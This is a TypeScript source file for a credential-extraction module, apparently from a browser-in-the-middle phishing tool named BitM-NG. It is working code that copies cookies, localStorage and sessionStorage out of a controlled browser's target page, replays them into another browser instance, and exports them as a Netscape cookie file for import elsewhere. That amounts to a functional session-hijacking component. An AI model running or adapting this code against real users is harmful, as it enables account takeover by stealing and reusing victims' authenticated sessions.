import type { BrowserPoolManager } from './BrowserPoolManager.js';
import { logger } from '../utils/logger.js';

// Cookie type from Puppeteer
interface Cookie {
  name: string;
  value: string;
  domain?: string;
  path?: string;
  expires?: number;
  httpOnly?: boolean;
  secure?: boolean;
  sameSite?: 'Strict' | 'Lax' | 'None';
}

export interface CredentialData {
  cookies: Cookie[];
  localStorage: Record<string, string>;
  sessionStorage: Record<string, string>;
  indexedDB?: unknown;
  url: string;
  extractedAt: Date;
}

export class CredentialExtractor {
  constructor(private browserPoolManager: BrowserPoolManager) {}

  /**
   * Extract credentials from a browser instance
   */
  async extractCredentials(browserId: string): Promise<CredentialData> {
    const browser = this.browserPoolManager.getBrowser(browserId);
    if (!browser) {
      throw new Error(`Browser ${browserId} not found`);
    }

    const page = browser.targetPage;

    logger.info(`Extracting credentials from browser ${browserId}`);

    try {
      // Extract all credential types in parallel
      const [cookies, localStorage, sessionStorage] = await Promise.all([
        this.extractCookies(page),
        this.extractLocalStorage(page),
        this.extractSessionStorage(page),
      ]);

      const credentialData: CredentialData = {
        cookies,
        localStorage,
        sessionStorage,
        url: page.url(),
        extractedAt: new Date(),
      };

      logger.info(`Credentials extracted from browser ${browserId}`, {
        cookiesCount: cookies.length,
        localStorageKeys: Object.keys(localStorage).length,
        sessionStorageKeys: Object.keys(sessionStorage).length,
        url: page.url(),
      });

      return credentialData;
    } catch (error) {
      logger.error(`Error extracting credentials from browser ${browserId}:`, error);
      throw error;
    }
  }

  /**
   * Extract cookies using Puppeteer's public API
   */
  private async extractCookies(page: any): Promise<Cookie[]> {
    return await page.cookies();
  }

  /**
   * Extract localStorage using page.evaluate()
   */
  private async extractLocalStorage(page: any): Promise<Record<string, string>> {
    return await page.evaluate(() => {
      const storage: Record<string, string> = {};
      // @ts-ignore - browser context
      for (let i = 0; i < window.localStorage.length; i++) {
        // @ts-ignore - browser context
        const key = window.localStorage.key(i);
        if (key) {
          // @ts-ignore - browser context
          storage[key] = window.localStorage.getItem(key) || '';
        }
      }
      return storage;
    });
  }

  /**
   * Extract sessionStorage using page.evaluate()
   */
  private async extractSessionStorage(page: any): Promise<Record<string, string>> {
    return await page.evaluate(() => {
      const storage: Record<string, string> = {};
      // @ts-ignore - browser context
      for (let i = 0; i < window.sessionStorage.length; i++) {
        // @ts-ignore - browser context
        const key = window.sessionStorage.key(i);
        if (key) {
          // @ts-ignore - browser context
          storage[key] = window.sessionStorage.getItem(key) || '';
        }
      }
      return storage;
    });
  }

  /**
   * Inject credentials into a browser instance
   */
  async injectCredentials(browserId: string, credentials: CredentialData): Promise<void> {
    const browser = this.browserPoolManager.getBrowser(browserId);
    if (!browser) {
      throw new Error(`Browser ${browserId} not found`);
    }

    const page = browser.targetPage;

    logger.info(`Injecting credentials into browser ${browserId}`);

    try {
      // Navigate to the URL first (required for setting cookies)
      await page.goto(credentials.url, { waitUntil: 'networkidle2' });

      // Set cookies
      if (credentials.cookies.length > 0) {
        await page.setCookie(...credentials.cookies);
      }

      // Inject localStorage
      if (Object.keys(credentials.localStorage).length > 0) {
        await page.evaluate((storage) => {
          Object.entries(storage).forEach(([key, value]) => {
            // @ts-ignore - browser context
            window.localStorage.setItem(key, value);
          });
        }, credentials.localStorage);
      }

      // Inject sessionStorage
      if (Object.keys(credentials.sessionStorage).length > 0) {
        await page.evaluate((storage) => {
          Object.entries(storage).forEach(([key, value]) => {
            // @ts-ignore - browser context
            window.sessionStorage.setItem(key, value);
          });
        }, credentials.sessionStorage);
      }

      logger.info(`Credentials injected into browser ${browserId}`);
    } catch (error) {
      logger.error(`Error injecting credentials into browser ${browserId}:`, error);
      throw error;
    }
  }

  /**
   * Format credentials as JSON string
   */
  formatCredentials(credentials: CredentialData): string {
    return JSON.stringify(credentials, null, 2);
  }

  /**
   * Format credentials as Netscape cookie format (for browser import)
   */
  formatAsNetscapeCookies(credentials: CredentialData): string {
    const lines: string[] = [
      '# Netscape HTTP Cookie File',
      '# This file was generated by BitM-NG',
      '#',
    ];

    credentials.cookies.forEach((cookie) => {
      const domain = cookie.domain || 'localhost';
      const normalizedDomain = domain.startsWith('.') ? domain.slice(1) : domain;
      const includeSubdomains = domain.startsWith('.') ? 'TRUE' : 'FALSE';
      const path = cookie.path || '/';
      const secure = cookie.secure ? 'TRUE' : 'FALSE';
      const expires = cookie.expires ? Math.floor(cookie.expires) : '0';
      const name = cookie.name;
      const value = cookie.value;

      lines.push(`${normalizedDomain}\t${includeSubdomains}\t${path}\t${secure}\t${expires}\t${name}\t${value}`);
    });

    return lines.join('\n');
  }
}

